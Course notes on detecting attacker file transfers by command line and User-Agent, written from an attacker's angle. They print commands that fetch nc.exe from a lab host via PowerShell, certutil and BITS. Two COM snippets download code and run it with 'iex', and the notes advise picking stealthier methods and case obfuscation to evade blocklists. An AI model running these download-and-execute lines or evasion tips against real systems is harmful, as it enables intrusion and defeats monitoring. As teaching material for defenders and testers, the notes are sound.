# 09 — Detection

## Overview

This section flips the perspective — **how do defenders detect the file transfer techniques we've been learning?** Understanding detection helps you choose stealthier methods and anticipate what blue teams are watching for.

Two primary detection methods:

1. **Command-line monitoring** — watching what commands are executed
2. **User-Agent analysis** — identifying HTTP clients by their signatures

---

## Command-Line Detection

### Blacklisting vs Whitelisting

| Approach | How It Works | Effectiveness |
|----------|-------------|---------------|
| **Blacklisting** | Block known-bad commands | ❌ Easy to bypass with case obfuscation (`CeRtUtIl`) |
| **Whitelisting** | Allow only known-good commands | ✅ Very robust — anything unusual triggers an alert |

> Whitelisting takes more upfront work but catches novel techniques. Blacklisting is a game of cat-and-mouse.

---

## User-Agent Detection

Every HTTP client sends a **User-Agent string** identifying itself. Defenders can build a whitelist of legitimate user agents (browsers, Windows Update, AV updates) and flag anything unusual.

### What Defenders Look For

Normal traffic has user agents like:
- `Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/...` — browsers
- `Microsoft-Delivery-Optimization/...` — Windows Update

Suspicious traffic has user agents like:
- `WindowsPowerShell/5.1` — PowerShell downloading files
- `Microsoft-CryptoAPI/10.0` — Certutil downloading files
- `Microsoft BITS/7.8` — BITS transfer

---

## User-Agent Fingerprints by Transfer Method

### Invoke-WebRequest / Invoke-RestMethod (PowerShell)

**Client:**
```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

**Server Sees:**
```
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

> 🔴 Dead giveaway — `WindowsPowerShell` is right in the user agent string.

---

### WinHttpRequest (COM Object)

**Client:**
```powershell
$h = New-Object -ComObject WinHttp.WinHttpRequest.5.1
$h.open('GET','http://10.10.10.32/nc.exe',$false)
$h.send()
iex $h.ResponseText
```

**Server Sees:**
```
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

> 🟡 Less obvious than PowerShell but `WinHttp.WinHttpRequest` is uncommon in normal browsing.

---

### Msxml2 (COM Object)

**Client:**
```powershell
$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','http://10.10.10.32/nc.exe',$false)
$h.send()
iex $h.responseText
```

**Server Sees:**
```
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

> 🟢 Looks like Internet Explorer — harder to distinguish from legitimate traffic.

---

### Certutil

**Client:**
```cmd
certutil -urlcache -split -f http://10.10.10.32/nc.exe
```

**Server Sees:**
```
User-Agent: Microsoft-CryptoAPI/10.0
```

> 🔴 `CryptoAPI` making HTTP requests is suspicious and easily flagged.

---

### BITS (Background Intelligent Transfer Service)

**Client:**
```powershell
Import-Module bitstransfer
Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t
```

**Server Sees:**
```
User-Agent: Microsoft BITS/7.8
```

> 🟡 BITS is used legitimately by Windows Update, but context matters — BITS downloading `nc.exe` from an external IP is suspicious.

---

## Detection Cheat Sheet

| Method | User-Agent | Suspicion Level |
|--------|-----------|-----------------|
| `Invoke-WebRequest` | `WindowsPowerShell/5.1` | 🔴 High — obvious |
| `WinHttpRequest` | `WinHttp.WinHttpRequest.5` | 🟡 Medium |
| `Msxml2.XMLHTTP` | `MSIE 7.0 / Trident/7.0` | 🟢 Low — looks like IE |
| `certutil` | `Microsoft-CryptoAPI/10.0` | 🔴 High — well-known |
| `BITS` | `Microsoft BITS/7.8` | 🟡 Medium — legit use exists |

---

## Key Takeaways for Attackers

| Lesson | Implication |
|--------|-------------|
| Every HTTP tool has a fingerprint | Assume your user agent is being logged |
| PowerShell and Certutil are heavily monitored | Use alternatives when stealth matters |
| Msxml2 blends in best | Looks like IE traffic |
| BITS has legitimate use | Harder to flag but still detectable in context |
| Custom user agents can be set | Some tools let you override the default UA string |

> 💡 **Bottom line:** Defenders hunt for anomalous user agents in their SIEM. As an attacker, know what fingerprint you're leaving and choose methods that blend into the target's normal traffic.
